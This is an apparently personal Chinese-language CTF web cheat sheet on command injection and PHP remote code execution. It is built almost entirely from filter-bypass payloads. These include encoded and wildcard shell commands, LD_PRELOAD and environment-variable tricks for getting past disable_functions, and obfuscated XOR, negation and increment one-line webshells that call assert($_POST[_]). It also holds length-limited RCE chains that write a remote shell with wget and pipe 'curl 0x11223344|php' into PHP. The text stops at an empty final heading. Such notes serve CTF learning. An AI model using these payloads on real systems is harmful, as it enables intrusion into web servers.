---
title: 'CTF WEB 利用知识点总结'
description: 'CTF WEB 方向知识体系整理，涵盖常见漏洞类型、利用技巧和实战笔记。'
pubDate: 2026-06-13
author: 'IHK-1'
tags: ['CTF', 'WEB', '知识总结']
---

## Python 内存马
原理是通过 SSTI 在路由中添加一个路由，从而达成数据外带的操作（在不通网的情况下）

## Zip 软连接属性
原理是 zip 压缩的时候可以保持软连接属性，当解压出来的文件打开时，可以读取到软连接文件

```plain
zip -ry
tar -P
```

# 命令执行
## LINUX
### LINUX 命令执行
```plain
# 符号概念
  |		管道符		前面的输出作为后面的输入执行
  &		and符号	两条命令同时执行
  && 	逻辑与 	多条命令同时执行，只有前一个命令执行成功继续执行
  || 	逻辑或		多条命令同时执行，只有前命令执行失败继续执行
  ;		分号		多条命令同时执行，无论前面是否成功执行继续执行
  ``	反引号		命令块嵌入，反引号执行结果传入前一个命令执行 command `command` 执行完会变成 command command执行结果
  $()	符号		命令替换，会将执行命令嵌入，command $(command) 执行会变成 command command执行结果
  (xxx;xxx)	括号		命令组执行（括号中的内容会独立执行） (echo 1;echo 2)
  {}	花括号		括号内容会依次传递并执行 echo {1，2} = cat 1; cat 2，如果在花括号外则是后面给前面传递参数{cat,flag}
  []  中括号  范围传递 ls {ex[1-3],ex4}.sh ex1.sh  ex2.sh  ex3.sh  ex4.sh
  
# 文件描述
  cmd > file          将输出重定向到file
  cmd < file          将输入重定向到file
  cmd >> file         将输出以追加的方式重定向到file，类似 a 模式
  cmd << file         将文本内容作为输入
  cmd <> file         以读写模式把文件file重定向到输入
  cmd >| file         将命令的标准输出强制覆盖写入到文件中，即使文件已经存在并且具有写保护
  : > filename        将文件filename截断为0长度，如果文件不存在, 那么就创建一个0长度的文件
  cmd >&n             将命令的标准输出和标准错误输出都重定向到文件描述符n
  cmd m>&n            将一个文件描述符m重定向到另一个文件描述符n
  cmd >&-             关闭标准输出
  cmd <&n             输入来自文件描述符n* cmd m<&n  m来自文件描述各个n
  cmd <&-             关闭命令的标准输入文件描述符
  cmd <&n-            将命令的标准输入重定向自文件描述符n并关闭该文件描述符
  cmd >&n-            将命令的标准输出和标准错误输出都重定向到文件描述符n并关闭该文件描述符
```

### LINUX 文件读取
```plain
# cp 命令
  将 a 文件 复制到 b

# tee
  ls | tee 1.txt  # 输出内容到1.txt

# strings/paste
  strings 1.txt

# cat
  cat #显示文本内容
  tac #倒序显示文本内容

# nl
  nl file  # 显示文本内容
     1  root:x:0:0:root:/root:/bin/bash
     2  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
     3  bin:x:2:2:bin:/bin:/usr/sbin/nologin

# more
  more file  # 分页显示内容
  more +10 file  # 从指定行显示内容
  more +/string file  # 从指定字符串开始显示内容

# less
  less file       # 浏览file
  less -N file    # 浏览file，并且显示每行的行号
  less -m file    # 浏览file，并显示百分比

# head
  head -n 100 file        # 显示file的前100行
  head -n -100 file       # 显示file的除最后100行以外的内容。

# tail
  tail -100 file          # 显示file最后100行内容
  tail -n +100 file       # 从第100行开始显示file内容

# sort
  sort #排序显示内容
  sort -u #去重按照排序显示内容

# uniq
  uniq file           # 去除重复的行
  uniq -c file        # 去除重复的行，并显示重复次数
  uniq -d file        # 只显示重复的行
  uniq -u file        # 只显示出现一次的行
  uniq -i file        # 忽略大小写，去除重复的行
  uniq -w 10 file     # 认为前10个字符相同，即为重复

# dd

# od

# xxd

# hexdump

# rev

# base32

# base64

# sed

# 编辑文本内容
  vim
  vi
  od
  
>/dev/null 2>&1 #就是让标准输出重定向到/dev/null中（丢弃标准输出）
```

### LINUX 内容绕过
```plain
# 字符过滤
  1.拼接绕过
  a=c;b=at;c=fla;d=g;$a$b $c$d

  2.巧用引号（类似 PHP 的 'aaa'.'bbb'）0    ca""t fla""g.txt
    ca''t fl''ag.txt
    ca""t fla''g.txt

  3.反斜杠类
    ca\t fla\g.txt

  4.特殊构造
    cat fl**
      
    cat f[lc]ag.txt
    cat fl[abc]g.txt
      
    cat fl{a,b,c}g.txt
    cat fla{d,g}.txt

    c{a,b}t flag.txt
    {c,a}{a,b}t flag.txt
  
  5.通配符，搭配 [] {} 遍历特性
    cat fl?g.txt
    cat fla?.txt
    /???/???/?at	flag.txt
    /???/?at flag.txt
    /???/?[a]''[t] flag.txt

  6.特殊变量
    $0	当前脚本文件名
    $n	传递的参数的第n个参数，ca$1t fl$2ag.txt ca$1t fl$2ag.txt 传递的参数拼接都是cat flag.txt
    $#	传递给脚本函数的个数
    $*	传递给脚本的所有参数
    $@	传递给脚本的所有参数
    $?	上个命令的推出状态
    $$	当前进程shell进程ID

    都可以随地传递，拼接结果都为命令

  7. 命令行绕过（任意切割字符串）
    p=$(pwd)
    echo ${p:0:1}
  
  8.编码绕过
    可以任意组合，解码后靠 $() 进行命令执行
    大致分两类：1.直接 echo 编码 | 编码解码命令
               2.直接 $'编码' 
    
    base64
      `echo "Y2F0IGZsYWcudHh0"|base64 -d`
      echo "Y2F0IGZsYWcudHh0"|base64 -d|bash

    二进制 BashFuck
      SRC 综合利用有一个
      $0<<<$0\<\<\<\$\'\\$(($((1<<1))#10100111))\\$(($((1<<1))#10010110))\\$(($((1<<1))#10011101))\\$(($((1<<1))#10001101))\\$(($((1<<1))#10011011))\\$(($((1<<1))#10010111))\'
    
    hex
      printf '\x63\x61\x74\x20\x2f\x66\x6c\x61\x67' | bash
      $'\x77\x68\x6f\x61\x6d\x69'
      echo 'cat flag.txt' |xxd
      echo "0x63617420666c61672e7478740a" | xxd -r -p | bash
  
    8进制
      printf "\143\141\164\40\57\146\154\141\147\n" | bash
      echo "cat flag.txt" | od -An -t o1
      $'\143\141\164' $'\146\154\141\147\056\164\170\164'
      $(echo $'\143\141\164\40\57\146\154\141\147')
      echo $'\143\141\164\40\57\146\154\141\147' | bash
      $(printf "\143\141\164\040\146\154\141\147\056\164\170\164\012")

  9.命令代替
    cat                 从第一行开始显示内容，并将所有内容输出
    tac                 从最后一行倒序显示内容，并将所有内容输出
    more                根据窗口大小，一页一页的显示文件内容
    less                根据窗口大小，显示文件内容
    head                用于显示头几行
    tail                用于显示最后几行
    nl                  类似于cat -n，显示时输出行号
    tailf               类似于tail -f
    sort                读文件
    rev									倒读文件
    dd

  10.空格绕过
    ${IFS}
    $IFS
    $IFS$1-9 // $IFS$1 $IFS$2 因为 $IFS 就是几个空格
     
    <		重定向替代空格 cat</flag
    <>	重定向替代空格
    
    {cat,flag.txt}		花括号
    %09 							tab符号绕过
    X=$'cat\x20/etc/passwd'&&$X		16进制

    cat\		换行拼接
      \
     flag,txt

   11.过滤斜杠
     ${HOME:0:1}
     ${echo . | tr !-0 "-1}
     a=$(pwd);cat ${a:0:1}

  12.长度检测
     换行拼接，具体还有四字RCE和五字RCE，详细看 限制字数的 RCE
      cat\		
       \
      flag,txt

      文件名拼接
      >a
      >who
      >ami
      ls>a
      ./a 或者 sh a

      cat flag 为例子
        cat /flag >> galf/ tac
          对应的命令 
          ls -t >y
          rev y>x 
          a=$(pwd);cat ${a:0:1}flag;
        
        依次分割三个字符然后>输入文件
          >dir // 用 dir 不会有多余的文件
          >e\> // ls -t >%s 这个 %s 一定要比 d< %s <h ，这样才能按照 x> ht- sl 排序
          >ht-
          >sl
          *>v  // *>v 会依次执行，因为 dir 第一个输入，所以变成 dir ["e>" "ht-" "sl" > v]

          >rev
          *v>y  // *y 则变成 rev y > x，此时 y y 的内容变成了 ls  -th  >e

          >;gla
          ...
          >a=$

          sh x

        php 为例子 curl 0x11223344|php
        
          

  13.截断绕过
    $
    ;
    |
    -
    (
    )
    `
    ||
    &&
    &
    }
    {
    %0a
    %0d
    # 直接注释后面

  14. $ 符号妙用
    $0	脚本本身的名字
    $1	脚本后所输入的第一串字符
    $2	传递给该shell脚本的第二个参数
    $*	脚本后所输入的所有字符’westos’ ‘linux’ ‘lyq’
    $@	脚本后所输入的所有字符’westos’ ‘linux’ ‘lyq’
    $_	表示上一个命令的最后一个参数
    $#	#脚本后所输入的字符串个数
    $$	脚本运行的当前进程ID号
    $!	表示最后执行的后台命令的PID
    $?	显示最后命令的退出状态，0表示没有错误，其他表示由错误
    $xxx  xxxx为环境遍历名
```

## PHP
### PHP 命令执行函数
```plain
# 直接执行命令
  passthru(shell 命令);
  exec(shell 命令); 				// 无回显
  shell_exec(shell 命令);
  system(shell 命令);
  `shell 命令` 							// PHP 代码直接执行
  eval(PHP 代码);
  (函数)(命令);
  $a($b)
  ${php代码}  							# 模板php执行代码

# 先执行后判断函数，都是因为先执行命令，然后在进行排序，之类的操作
  assert(执行命令); // assert(执行命令,"message") 类似 if(执行命令){echo "message"}，原理都是先执行判断
  usort(执行命令); // 优先执行命令，后排序操作
  preg_replace(执行命令); // 优先执行命令，后进行匹配
  array_map(执行命令); // 类似 python 的 map 函数批量处理，对 array_map(操作函数名,数组) 数组进行执行函数名操作
  array_reduce(执行命令); // 对 array_reduce(操作函数名,数组) 数组进行自定义返回操作
  array_filter(执行命令); // 对 array_filter(操作函数名,数组) 数组进行执行函数名过滤操作
  
# 先执行自定义函数名后操作，都是对已有的函数名的字符串进行调用，当然也可以直接传参执行命令

  create_function('','a')  # 创建一个匿名函数执行
  # 比如 名称=a ，代码=}phpinfo();/*
  # create_function(名称){
      }phpinfo();/* 多行注释
      
  call_user_func(执行命令); // call_user_func('a', $a)，对 $a 进行 a 函数操作
  call_user_func_array(执行命令); // call_user_func_array('a', $array)，对 $a 数组进行 a 函数操作
```

### PHP disable_function 绕过
disable_function 绕过方法，具体看 提权部分 disable_function

```plain
# disable_function 可以使用蚁剑等工具，进行 put_env ，LD_PRELOAD 劫持
  export LD_PRELOAD=so文件路径 // 不一定文件后缀为 so

# 衍生的环境变量
BASH_ENV：可以在bash -c的时候注入任意命令 // BASH_ENV_func%%=(){command;}
ENV：可以在sh -i -c的时候注入任意命令
PS1：可以在sh或bash交互式环境下执行任意命令
PROMPT_COMMAND：可以在bash交互式环境下执行任意命令
BASH_FUNC_xxx%%：可以在bash -c或sh -c的时候执行任意命令
```

### PHP 文件读取文件
```plain
# 通过单一函数读取文件
  c=echo file_get_contents("flag.php");
  c=readfile("flag.php");
  c=var_dump(file('flag.php'));
  c=print_r(file('flag.php'));

# 搭配fopen去读取文件内容，这里介绍下函数
  fread()
  fgets()
  fgetc()
  fgetss()
  fgetcsv()
  gpassthru()

  payload:
    c=$a=fopen("flag.php","r");while (!feof($a)) {$line = fgets($a);echo $line;}//一行一行读取
    c=$a=fopen("flag.php","r");while (!feof($a)) {$line = fgetc($a);echo $line;}//一个一个字符读取
    c=$a=fopen("flag.php","r");while (!feof($a)) {$line = fgetcsv($a);var_dump($line);}

# 通过高亮显示php文件
  show_source("flag.php");
  highlight_file("flag.php");
```

### PHP 正则表达式
| 元字符 | 行为 |
| --- | --- |
| * | 至少匹配 0 次 {0,} |
| + | 至少匹配 1 次 {1,} |
| ? | 前面有表达式，匹配 0次 或 1次<br/>后面又表达式，非贪婪匹配，匹配最少的字符 |
| ^ | 从头开始匹配 |
| $ | 从尾巴开始匹配 \d{3}$ |
| . | 匹配除 \n 之外的任何字符 |
| [] | 匹配 [] 内容，匹配括号表达式开头和结尾 |
| {} | 匹配 {} 内容次数，匹配限定表达式开始和结尾 |
| () | 匹配 () 正则匹配，匹配子表达式开始和结尾 A(\d) 与“A0”至“A9”匹配 |
| | | 多项内选择 |
| / | 匹配表达式的开始和结尾 |
| \ | 转义 |
| \b | 字符边界匹配 er\b 与 “never”中的“er”匹配，但与“verb”中的“er”不匹配 |
| \B | 非字符边界匹配 er\B 与“verb”中的“er”匹配，但与“never”中的“er”不匹配 |
| \d | 匹配数字 [0-9] |
| \D | 匹配非数字 [^0-9] |
| \w | 匹配 [A-Za-z0-9_] |
| \W | 匹配非 [^A-Za-z0-9_] |
| [xyz] | 匹配字符集 |
| [^xyz] | 匹配非字符集内容 |
| [a-z] | 匹配字符集范围 |
| [^a-z] | 匹配非字符集范围 |
| {n} | 匹配 n 次 |
| {n,} | 匹配至少 n 次 |
| {n,m} | 匹配 n-m 次 |
| \cx | 匹配控制字符 |
| \xn | 匹配 16 进制字符，比如 \x01 \x02 |
| \num | 将前面式子再匹配 num 次 |
| \n | 如果前面式子有 n 次，将前面式子再匹配 n 次 <br/>如果前面式子没有 n 次，则当作八进制匹配 \9<br/>也许可以构造 |
| \nm | 如果前面式子有 nm 次，将前面式子再匹配 nm 次<br/>如果前面式子没有 nm 次，则当作八进制匹配 \91 |
| \nml | 当 n 为 8 进制，m 和 l 都为 8 进制，匹配 nml 次 |
| \un | 匹配 unicode，比如 \u0010 |
| \f | 换页符 |
| \n | 换行符 |
| \r | 回车符 |
| \s | 任何空白字符 |
| \S | 任何非空白字符 |
| \t | 水平制表符 |
| \v | 垂直制表符 |


### PHP 内容绕过
拼接 截断 编码 换行

```plain
# sed -i 插入文件

# replace
  若是匹配头则 %0a 换行绕过 \^
  回溯次数绕过，因为一般匹配会有回溯大小限制，溢出绕过即可
    payload：'f': 'very' * 250000 + 'CTF'
  
# 字符过滤
  1.二次url编码
    payload :ls -al  # 6c%73%20%2d%61%6c

  2.''拼接
    payload :echo `nl fl''ag.p''hp`; 

  3."." '.'  拼接
    payload :"/var/l"."og/nginx/access.l"."og" # "."拼接
    可以搭配 ('s'.'ystem')('comm'.'and') 
            
  4.\转义 
    payload :fla\g  # 转义字符（虽然还是原来的字符
  
  5.赋值绕过 
    payload : ;q=a;cat fl$qg

  6.无参数绕过
    1.getallheaders()和apache_request_headers()  # 获取全部headers转为数组， 然后再通过header头传参，例如自己传参：shell=phpinfo()，通过数组自己改变取值位置执行
      payload :eval(pos(getallheaders()))

    2.get_defined_vars()  # 返回所有全局变量的值，如cookie get post file
      payload :?shell=phpinfo();&code=eval(pos(pos(get_defined_vars())));

    3.session_id()
      payload :eval(hex2bin(session_id(session_start())));  # 通过session传参

    4.get_lg() # 从 cookie 的 lg 字段获取值

    5.get_backurl() # 从 url 传参的 backurl 获取值

  7.编码绕过
    1.hex2bin()
  
# 大小写
  Flag
  
# 截断符号过滤
  " ; " " 0a " "&&"同"%26%26" "||"同"%7c%7c"

# 空格绕过
  space: %20 
  tab: %09
  LF: %0a
  FF: %0c
  CR: #0d
  VT: %0b
  
# 下环线绕过
  ' ' 空格绕过
  [ 绕过

# php下正则表达式的特殊解析：
  例如 $_GET['foo_bar']
  
  /?*foo*bar*=bla
    第一个*只要是字符 ' ' '&' '+' 都可以互相进行等效替代
    第二个*只要是字符 ' ' '+' '.' '[' '_' 都可以互相进行等效替代
    第三个*只要是字符 '%00' '&' '=' 都可以互相进行等效替代

# 数字过滤
  ${_}=""
  $((${_}))=0
  $((~$((${_}))))=-1

# ?绕过
  <script 标签

# 双重URL 绕过
  因为 双重URL解码后单层 URL 编码仍然能被 PHP解析

# 长度绕过
  短命令执行
    原理：>1   输入该命令后，即可输入文件，然后执行文件即可
    比如：>1		//写入文件
          ls	//写入内容
          1		//执行文件
          
   拼接：
     一个反斜杠 \ ：分成多次输入
       1>wget\
      >域名.\
      >com\
      >-O\
      >she\
      >ll.p\
      >p
      ls>a
      sh a
      在目标服务器创建个文件名为a的文件，内容为’wget 域名.com -O shell.pp’

    两个反斜杠\\
      >ls\\
      ls>_
      >\ \\
      >-t\\
      >\>g
      ls>>_

    以下为 7字节rce
```

### PHP 限制字数的 RCE
WAF

```plain
<?php
    $sandbox = '/www/sandbox/' . md5("orange" . $_SERVER['REMOTE_ADDR']);
    @mkdir($sandbox);
    @chdir($sandbox);
    if (isset($_GET['cmd']) && strlen($_GET['cmd']) <= 5) {
        @exec($_GET['cmd']);
    } else if (isset($_GET['reset'])) {
        @exec('/bin/rm -rf ' . $sandbox);
    }
    highlight_file(__FILE__);
?>
```

绕过方法，原理就是 linux 的字符限制绕过，用 \ 拼接

```plain
command = 'ls -al'
url = ''
for i in range(0,len(command),3):
    print(command[i:i+3] + '\\\\')

>>
ls \\
-al\\
```

四字节 RCE，具体可以看 Linux 内容绕过

```plain
1.换行拼接，具体还有四字RCE和五字RCE，详细看 限制字数的 RCE
    cat\		
    \
    flag,txt

2.文件名拼接
  >a
  >who
  >ami
  ls>a
  ./a 或者 sh a

  cat flag 为例子
    cat /flag >> galf/ tac
      对应的命令 
      ls -t >y
      rev y>x 
      a=$(pwd);cat ${a:0:1}flag;
        
    依次分割三个字符然后>输入文件
      >dir // 用 dir 不会有多余的文件
      >e\> // ls -t >%s 这个 %s 一定要比 d< %s <h ，这样才能按照 x> ht- sl 排序
      >ht-
      >sl
      *>v  // *>v 会依次执行，因为 dir 第一个输入，所以变成 dir ["e>" "ht-" "sl" > v]

      >rev
      *v>y  // *y 则变成 rev y > x，此时 y y 的内容变成了 ls  -th  >e

      >;gla
      ...
      >a=$

      sh x

    php 为例子 curl 0x11223344|php
```

### PHP 无参数RCE
WAF

```php
<?php
  highlight_file(__FILE__);
if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])) {    
  eval($_GET['code']);
}

# /[^\W]+\((?R)?\)/
# [^\W]+ 即匹配 \w+ 匹配任意字符 
# \((?R)?\) 即匹配 '('  (?R)?  ')'
# (?R)? 即非贪婪匹配表达式多次
```

RCE 原理

```plain
# RCE原理
# 获取当前路径所有文件
  1.localeconv()  # 返回一包含本地数字及货币格式信息的数组,第一项就是"."
    pos() / current()  # 返回数组第一个信息
    scandir()  # 返回目录
  
  说明：不能用echo查看，需要输出多行，使用Print_r输出，否则输出array
  localeconv输出：
  Array
  (
      [decimal_point] => .
      [thousands_sep] => 
      [int_curr_symbol] => 
      [currency_symbol] => 
      [mon_decimal_point] => 
      [mon_thousands_sep] => 
      [positive_sign] => 
      [negative_sign] => 
      [int_frac_digits] => 127
      [frac_digits] => 127
      [p_cs_precedes] => 127
      [p_sep_by_space] => 127
      [n_cs_precedes] => 127
      [n_sep_by_space] => 127
      [p_sign_posn] => 127
      [n_sign_posn] => 127
      [grouping] => Array
          (
          )

      [mon_grouping] => Array
          (
          )

  )

  2.chr(46)
    a.chr(rand())  # (不实际，看运气)
    b.chr(time())  # chr()函数以256为一个周期，所以chr(46),chr(302),chr(558)都等于"."
    c.chr(current(localtime(time())))

      localtime输出：
      Array
      (
          [0] => 59
          [1] => 17
          [2] => 5
          [3] => 10
          [4] => 3
          [5] => 124
          [6] => 3
          [7] => 100
          [8] => 0
      )

  d.phpversion()
    phpversion()  # 返回PHP版本，如5.5.9
    floor(phpversion())  # 返回 5
    sqrt(floor(phpversion()))  # 返回2.2360679774998
    tan(floor(sqrt(floor(phpversion()))))  # 返回-2.1850398632615
    cosh(tan(floor(sqrt(floor(phpversion())))))  # 返回4.5017381103491
    sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))  # 返回45.081318677156
    ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))  # 返回46

  e.crypt()  # 加密成hash，内容随意
    crypt(arg)  # 可以随机生成一个hash值，第一个字符随机是$(大概率) 或者 "."(小概率) 然后通过chr(ord())只取第一个字符
    hebrevc(crypt(time))  # 增加随机性，并通过反向希伯来字符转换 \n 为<br> 保持一行

# 读取当前文件
  # 数组操作
  current()  # 返回数组第一位
  each()  # 返回数组中当前键
  end()  # 返回数组中最后一位
  next()  # 将数组内部指针向后移动一位
  prev()  # 将数组内部指针向前移动一位

  array_reverse()  # 数组倒序
  next(array_reverse())  # 倒数第二个
  array_rand(array_flip(array))  # array_flip转换为数组，array_rand取随机一个

  # 读取操作
  readfile()
  readgzfile()
  show_source()

# 如果在其他路径
  1.dirname()  # 返回路径的目录部分 例如  /1/2/3 -> 1/2
    chdir()  # 改变当前工作目录
  
    payload: scandir(dirname(getcwd()))

  2.构造..
    getcwd()  # 获取当前目录
    next(scandir(getcwd()))  # 获取..
  
    payload: scandir(next(scandir(getcwd())))
  	
  3.多级构造
    show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd())))))))))));
    或更复杂的：
    show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))))));
    还可以用：
    show_source(array_rand(array_flip(scandir(chr(current(localtime(time(chdir(next(scandir(current(localeconv()))))))))))));//这个得爆破，不然手动要刷新很久，如果文件是正数或倒数第一个第二个最好不过了，直接定位

    if构造  # 通过if语句执行，然后再读取内容
    payload :if(chdir(next(scandir(getcwd()))))show_source(array_rand(array_flip(scandir(getcwd()))));

  4.构造 /
    strrev(crypt(serialize(array())))  # 取hash时候有概率取到 /
  
    payload :scandir(chr(ord(strrev(crypt(serialize(array()))))))
           if(chdir(chr(ord(strrev(crypt(serialize(array())))))))print_r(scandir(getcwd()));
  
# 无参数RCE 绕过
  1.getallheaders()和apache_request_headers()  # 获取全部headers转为数组， 然后再通过header头传参，例如自己传参：shell=phpinfo()，通过数组自己改变取值位置执行
    payload :eval(pos(getallheaders()))

  2.get_defined_vars()  # 返回所有全局变量的值，如cookie get post file
    payload :?shell=phpinfo();&code=eval(pos(pos(get_defined_vars())));

  3.session_id()
    payload :eval(hex2bin(session_id(session_start())));  # 通过session传参

  4.get_lg() # 从 cookie 的 lg 字段获取值

  5.get_backurl() # 从 url 传参的 backurl 获取值

  请在先知或者本地查看
    https://blog.csdn.net/2301_76690905/article/details/133808536

# 搭配无字母可以使用二维数组拼接成一个数组，然后输出其实是拼接的字符串
  [~%8C%86%8C%8B%9A%92][!%FF]([~%8F%90%8C][!%FF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][!%FF]()));
```

### PHP 无字母有数字 RCE
WAF

```plain
function hello_shell($cmd){
    if(preg_match("/[A-Za-z\"%*+,-.\/:;=>?@[\]^`|]/", $cmd)){
        die("WAF!");
    }
    system($cmd);
}
```

绕过方法 

```plain
# 16 进制绕过
```

### PHP 无字母无数字RCE
WAF

```php
<?php
  highlight_file(__FILE__);
$code = $_GET['code'];
if(preg_match("/[A-Za-z0-9]+/",$code)){
  die("hacker!");
}
@eval($code);
```

绕过方法，底层逻辑：底层逻辑都是通过

1. ('function')('payload') 让 function 和 payload 转换为字符串执行，
2. $function($payload) 让 function 和 payload 转换为覆盖变量执行。

注意：

1. 而且旧版本不支持 1 方法
2. 不能使用 eval() 直接进行构造，可能是 PHP 的限制
3. PHP5 之后不能通过  assert('$_POST['_']') 进行执行，即参数直接为 '$_POST['cmd']' 的字符串，不符合语法，没有通过 $$ 符号进行转换成动态函数

```plain
<?php

$_="eval";
$__="_GET";
$_($$__['_']);

?>
```

```plain
# 英文过滤
  1.异或绕过_1 异或绕过注意 ('a'^'b') 才是一个字符串
    $_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`')
    // $_='assert'
    $__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']')
    // $__='_POST'
    $___=$$__
    // assert($_POST[_])
    一句话绕过
    $_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`');$__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']');$___=$$__;$_($___[_]);&_=phpinfo();// 密码为 "_"

    PHP5以上版本
    $_=('%0C'^'%7F').('%06'^'%7F').('%0C'^'%7F').('%0B'^'%7F').('%1A'^'%7F').('%12'^'%7F');$__=('%13'^'%7F').('%0C'^'%7F');$_($__);
    $_=('%0C'^'%7F').('%06'^'%7F').('%0C'^'%7F').('%0B'^'%7F').('%1A'^'%7F').('%12'^'%7F');$__=('%13'^'%7F').('%0C'^'%7F');($_)($__);
  
  1.异或绕过_2
    ('%0c%06%0c%0b%1a%12'^'%7f%7f%7f%7f%7f%7f')('%13%0c'^'%7f%7f');
    $_='%0F%17%0F%16%11%19%10'^'%7F%7F%7F%7F%7F%7F%7F';$_();

  2.或绕过
    ("%13%19%13%14%05%0d"|"%60%60%60%60%60%60")("%0c%13%00%00"|"%60%60%20%2f")//system('ls /')
    
  3.进行取反（取反为 xor 0xff）
    a.直接执行
    例如system(cat /f)
    (~'%8C%86%8C%8B%9A%92')(~'%9C%9E%8B%DF%D0%99%D5')

    b.构造传参执行
    $_=~(%9E%8C%8C%9A%8D%8B);    //这里利用取反符号把它取回来，$_=assert
    $__=~(%A0%AF%B0%AC%AB);      //$__=_POST
    $___=$$__;                   //$___=$_POST
    $_($___[_]);                 //assert($_POST[_]);
    放到一排就是：
    $_=~(%9E%8C%8C%9A%8D%8B);$__=~(%A0%AF%B0%AC%AB);$___=$$__;$_($___[_]);

    生成代码:
      <?php
      $a="stystem";
      $b="('ls')";
      echo urlencode(~$a);
      echo "\n";
      echo urlencode(~$b);

    取反方法二：
      原理：利用的是 UTF-8 编码的某个汉字，将其中某个字符取出来，比如 '和'{2} 的结果是 "\x8c"，其再取反即可得到字母 s
      
      $_++;$__ = "极";$___ = ~($__{$_});$__ = "区";$___ .= ~($__{$_});$___ .= ~($__{$_});$__ = "皮";$___ .= ~($__{$_});$__ = "十";$___ .= ~($__{$_});$__ = "勺";$___ .= ~($__{$_});$____ = '_';$__ = "寸";$____ .= ~($__{$_});$__ = "小";$____ .= ~($__{$_});$__ = "欠";$____ .= ~($__{$_});$__ = "立";$____ .= ~($__{$_});$_ = $$____;$___($_[_]);

      $_++;                //得到1，此时$_=1
      $__ = "极";
      $___ = ~($__{$_});   //得到a，此时$___="a"
      $__ = "区";
      $___ .= ~($__{$_});   //得到s，此时$___="as"
      $___ .= ~($__{$_});   //此时$___="ass"
      $__ = "皮";
      $___ .= ~($__{$_});   //得到e，此时$___="asse"
      $__ = "十";
      $___ .= ~($__{$_});   //得到r，此时$___="asser"
      $__ = "勺";
      $___ .= ~($__{$_});   //得到t，此时$___="assert"
      $____ = '_';          //$____='_'
      $__ = "寸";
      $____ .= ~($__{$_});   //得到P，此时$____="_P"
      $__ = "小";
      $____ .= ~($__{$_});   //得到O，此时$____="_PO"
      $__ = "欠";
      $____ .= ~($__{$_});   //得到S，此时$____="_POS"
      $__ = "立";
      $____ .= ~($__{$_});   //得到T，此时$____="_POST"
      $_ = $$____;           //$_ = $_POST
      $___($_[_]);           //assert($_POST[_])
      放到一排就是：
      $_++;$__ = "极";$___ = ~($__{$_});$__ = "区";$___ .= ~($__{$_});$___ .= ~($__{$_});$__ = "皮";$___ .= ~($__{$_});$__ = "十";$___ .= ~($__{$_});$__ = "勺";$___ .= ~($__{$_});$____ = '_';$__ = "寸";$____ .= ~($__{$_});$__ = "小";$____ .= ~($__{$_});$__ = "欠";$____ .= ~($__{$_});$__ = "立";$____ .= ~($__{$_});$_ = $$____;$___($_[_]);


  4.动态函数特性
    valid = "1234567890!@$%^*(){}[];\'\",.<>/?-=_`~ "
    answer = "phpinfo"

    生成代码
      tmp1,tmp2 = '',''
      for c in answer:
       for i in valid:
        for j in valid:
            if (ord(i)^ord(j) == ord(c)):
                tmp1 += i
                tmp2 += j
                break
        else:
            continue
        break
      print(tmp1,tmp2)

    ?code=$_='tmp1'^'tmp2';$_()

  5.自增绕过
    1.绕过原理：'A'++ ==> 'B'
    2.当列表拼接字符串会强制转换为array
    3.$str 定义字符串
      $$str 作用如下：即作为可变变量继续
      <?php
        $var = 'hello word !';
        $str = 'var';
        echo $str;
        echo $$str; //  $$str == $var
      ?>
    
    webshell:
      <?php
      $_=[];
      $_=@"$_"; // $_='Array';
      $_=$_['!'=='@']; // $_=$_[0];
      $___=$_; // A
      $__=$_;
      $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
      $___.=$__; // S
      $___.=$__; // S
      $__=$_;
      $__++;$__++;$__++;$__++; // E 
      $___.=$__;
      $__=$_;
      $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R
      $___.=$__;
      $__=$_;
      $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
      $___.=$__;

      $____='_';
      $__=$_;
      $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
      $____.=$__;
      $__=$_;
      $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
      $____.=$__;
      $__=$_;
      $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
      $____.=$__;
      $__=$_;
      $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
      $____.=$__;

      $_=$$____;
      $___($_[_]); // ASSERT($_POST[_]);

      RCE：
